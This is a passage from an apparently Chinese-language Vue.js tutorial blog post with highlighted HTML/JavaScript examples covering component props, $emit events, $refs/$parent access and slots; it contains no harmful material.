class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><strong>组件通信</strong></p>\n<p>父组件向子组件传值使用：props</p>\n<p>子组件向父组件传值使用：$emit events</p>\n<p>父组件传值，通过v-bind读取父组件的值：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;app&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">cpn2</span> <span class=\"attr\">:cmovies</span>=<span class=\"string\">&quot;movies&quot;</span> <span class=\"attr\">:cmessage</span>=<span class=\"string\">&quot;message&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">cpn2</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">template</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;mycpn2&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">h2</span>&gt;</span>标题2<span class=\"tag\">&lt;/<span class=\"name\">h2</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>&#123;&#123;cmessage&#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">ul</span> <span class=\"attr\">v-for</span>=<span class=\"string\">&quot;item in cmovies&quot;</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span>&#123;&#123;item&#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">ul</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">template</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">const</span> cpn = &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        template: <span class=\"string\">&#x27;#mycpn2&#x27;</span>,</span></span><br><span class=\"line\"><span class=\"javascript\">        props: [<span class=\"string\">&#x27;cmovies&#x27;</span>, <span class=\"string\">&#x27;cmessage&#x27;</span>],</span></span><br><span class=\"line\"><span class=\"javascript\">                props: &#123;           <span class=\"comment\">// 类型限制</span></span></span><br><span class=\"line\"><span class=\"javascript\">            cmovies: <span class=\"built_in\">Array</span>,</span></span><br><span class=\"line\"><span class=\"javascript\">            cmessage: <span class=\"built_in\">String</span></span></span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\"><span class=\"javascript\">          props: &#123;         <span class=\"comment\">// 类型和默认值</span></span></span><br><span class=\"line\">            cmovies: &#123;</span><br><span class=\"line\"><span class=\"javascript\">                type: <span class=\"built_in\">String</span>,</span></span><br><span class=\"line\"><span class=\"javascript\">                <span class=\"keyword\">default</span>: <span class=\"string\">&#x27;123&#x27;</span>,</span></span><br><span class=\"line\"><span class=\"javascript\">                          required: <span class=\"literal\">true</span></span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">let</span> app = <span class=\"keyword\">new</span> Vue(&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        el: <span class=\"string\">&#x27;#app&#x27;</span>,</span></span><br><span class=\"line\">        components: &#123;</span><br><span class=\"line\">            cpn2: cpn</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        data: &#123;</span><br><span class=\"line\"><span class=\"javascript\">            movies: [<span class=\"string\">&#x27;test1&#x27;</span>, <span class=\"string\">&#x27;test2&#x27;</span>, <span class=\"string\">&#x27;test3&#x27;</span>, <span class=\"string\">&#x27;test4&#x27;</span>],</span></span><br><span class=\"line\"><span class=\"javascript\">            message: <span class=\"string\">&#x27;父组件数据&#x27;</span></span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>子组件向父组件传递</p>\n<p>通过$emit发送事件的方式传递</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;app&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">cpn2</span> @<span class=\"attr\">itemclick</span>=<span class=\"string\">&quot;cpnclick&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">cpn2</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">template</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;mycpn2&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">v-for</span>=<span class=\"string\">&quot;item in categories&quot;</span> @<span class=\"attr\">click</span>=<span class=\"string\">&quot;btnClick(item)&quot;</span>&gt;</span>&#123;&#123;item.name&#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">template</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">const</span> cpn = &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        template: <span class=\"string\">&#x27;#mycpn2&#x27;</span>,</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"function\"><span class=\"title\">data</span>(<span class=\"params\"></span>)</span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"keyword\">return</span>&#123;</span></span><br><span class=\"line\">                categories: [</span><br><span class=\"line\"><span class=\"javascript\">                    &#123;<span class=\"attr\">id</span>: <span class=\"string\">&#x27;aaa&#x27;</span>, <span class=\"attr\">name</span>: <span class=\"string\">&#x27;test1&#x27;</span>&#125;,</span></span><br><span class=\"line\"><span class=\"javascript\">                    &#123;<span class=\"attr\">id</span>: <span class=\"string\">&#x27;bbb&#x27;</span>, <span class=\"attr\">name</span>: <span class=\"string\">&#x27;test2&#x27;</span>&#125;,</span></span><br><span class=\"line\"><span class=\"javascript\">                    &#123;<span class=\"attr\">id</span>: <span class=\"string\">&#x27;ccc&#x27;</span>, <span class=\"attr\">name</span>: <span class=\"string\">&#x27;test3&#x27;</span>&#125;,</span></span><br><span class=\"line\">                ]</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        methods: &#123;</span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"function\"><span class=\"title\">btnClick</span>(<span class=\"params\">item</span>)</span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">                <span class=\"built_in\">this</span>.$emit(<span class=\"string\">&#x27;itemclick&#x27;</span>, item)</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">let</span> app = <span class=\"keyword\">new</span> Vue(&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        el: <span class=\"string\">&#x27;#app&#x27;</span>,</span></span><br><span class=\"line\">        components: &#123;</span><br><span class=\"line\">            cpn2: cpn</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        methods: &#123;</span><br><span class=\"line\"><span class=\"javascript\">             <span class=\"function\"><span class=\"title\">cpnclick</span>(<span class=\"params\">item</span>)</span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">                <span class=\"built_in\">console</span>.log(<span class=\"string\">&#x27;父组件收到&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">                <span class=\"built_in\">console</span>.log(item)</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><strong>父子组件双向绑定</strong></p>\n<p>props的属性只能从父组件传过来，不能在子组件进行model绑定</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">template</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;counter&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        props: &#123;&#123;number1&#125;&#125;<span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">        data: &#123;&#123;cnumber1&#125;&#125;<span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text&quot;</span> <span class=\"attr\">v-model</span>=<span class=\"string\">&quot;cnumber1&quot;</span> @<span class=\"attr\">input</span>=<span class=\"string\">&quot;update&quot;</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">        props: &#123;&#123;number2&#125;&#125;<span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">        data: &#123;&#123;cnumber2&#125;&#125;<span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text&quot;</span> <span class=\"attr\">v-model</span>=<span class=\"string\">&quot;cnumber2&quot;</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">template</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">let</span> app = <span class=\"keyword\">new</span> Vue(&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        el: <span class=\"string\">&#x27;#app&#x27;</span>,</span></span><br><span class=\"line\">        data: &#123;</span><br><span class=\"line\">            num1: 0,</span><br><span class=\"line\">            num2: 1</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        methods: &#123;</span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"function\"><span class=\"title\">updatefather</span>(<span class=\"params\">num</span>)</span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">                <span class=\"built_in\">this</span>.num1 = num</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        components: &#123;</span><br><span class=\"line\">            cpn: &#123;</span><br><span class=\"line\"><span class=\"javascript\">                template: <span class=\"string\">&#x27;#counter&#x27;</span>,</span></span><br><span class=\"line\">                props: &#123;</span><br><span class=\"line\"><span class=\"javascript\">                    number1: <span class=\"built_in\">String</span>,</span></span><br><span class=\"line\"><span class=\"javascript\">                    number2: <span class=\"built_in\">String</span></span></span><br><span class=\"line\">                &#125;,</span><br><span class=\"line\"><span class=\"javascript\">                <span class=\"function\"><span class=\"title\">data</span>(<span class=\"params\"></span>)</span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">                    <span class=\"keyword\">return</span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">                        cnumber1: <span class=\"built_in\">this</span>.number1,</span></span><br><span class=\"line\"><span class=\"javascript\">                        cnumber2: <span class=\"built_in\">this</span>.number2</span></span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;,</span><br><span class=\"line\">                methods: &#123;</span><br><span class=\"line\"><span class=\"javascript\">                    <span class=\"function\"><span class=\"title\">update</span>(<span class=\"params\">event</span>)</span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">                        <span class=\"built_in\">this</span>.$emit(<span class=\"string\">&#x27;updatefather&#x27;</span>, event.target.value)</span></span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>监听某个值的改变，可以直接用watch方法</p>\n<p><strong>父子组件互相访问</strong></p>\n<p>父组件访问子组件：使用<code>$children</code>或者<code>$ref</code></p>\n<p>子组件访问父组件：使用<code>$parent</code></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;app&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">cpn</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">cpn</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">cpn</span> <span class=\"attr\">ref</span>=<span class=\"string\">&quot;aaa&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">cpn</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">button</span> @<span class=\"attr\">click</span>=<span class=\"string\">&quot;btnClick&quot;</span>&gt;</span>按钮<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">template</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;cpn&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        子组件</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">template</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">let</span> app = <span class=\"keyword\">new</span> Vue(&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        el: <span class=\"string\">&#x27;#app&#x27;</span>,</span></span><br><span class=\"line\">        methods: &#123;</span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"function\"><span class=\"title\">btnClick</span>(<span class=\"params\"></span>)</span> &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">                <span class=\"built_in\">this</span>.$children[<span class=\"number\">0</span>].showMessage()</span></span><br><span class=\"line\"><span class=\"javascript\">                <span class=\"built_in\">this</span>.$refs[<span class=\"string\">&#x27;aaa&#x27;</span>].showMessage()</span></span><br><span class=\"line\"><span class=\"javascript\">                  <span class=\"built_in\">this</span>.$refs.aaa.showMessage()</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        components: &#123;</span><br><span class=\"line\">            cpn: &#123;</span><br><span class=\"line\"><span class=\"javascript\">                template: <span class=\"string\">&#x27;#cpn&#x27;</span>,</span></span><br><span class=\"line\">                methods: &#123;</span><br><span class=\"line\"><span class=\"javascript\">                    <span class=\"function\"><span class=\"title\">showMessage</span>(<span class=\"params\"></span>)</span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">                        <span class=\"built_in\">console</span>.log(<span class=\"string\">&#x27;show message&#x27;</span>)</span></span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"4-slot插槽\"><a href=\"#4-slot插槽\" class=\"headerlink\" title=\"4. slot插槽\"></a>4. slot插槽</h1><p>组件的插槽为了让封装的组件更具有扩展性</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;app&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">cpn</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">button</span>&gt;</span>按钮<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">cpn</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">cpn</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">span</span>&gt;</span>span标签<span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">cpn</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">cpn</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">cpn</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">template</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;cpn&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span>子组件<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">slot</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">button</span>&gt;</span>默认按钮<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">slot</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">template</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">let</span> app = <span class=\"keyword\">new</span> Vue(&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        el: <span class=\"string\">&#x27;#app&#x27;</span>,</span></span><br><span class=\"line\">        components: &#123;</span><br><span class=\"line\">            cpn: &#123;</span><br><span class=\"line\"><span class=\"javascript\">                template: <span class=\"string\">&#x27;#cpn&#x27;</span></span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><strong>具名插槽</strong></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">slot</span> <span class=\"attr\">name</span>=<span class=\"string\">&#x27;left&#x27;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">slot</span>&gt;</span></span><br><span class=\"line\">替换方法：</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">cpn</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">span</span> <span class=\"attr\">slot</span>=<span class=\"string\">&#x27;left&#x27;</span>&gt;</span>testme<span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">cpn</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><strong>作用域插槽</strong></p>\n<p>父组件替换插槽的标签，但是内容由子组件来提供</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;app&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">cpn</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">cpn</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">cpn</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">template</span> <span class=\"attr\">slot-scope</span>=<span class=\"string\">&quot;slot&quot;</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">span</span> <span class=\"attr\">v-for</span>=<span class=\"string\">&quot;item in slot.data&quot;</span>&gt;</span>&#123;&#123;item&#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span>  // 数据在子组件中，但是该标签的作用域在父组件里面，需要将内容传递过来</span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">template</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">cpn</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span 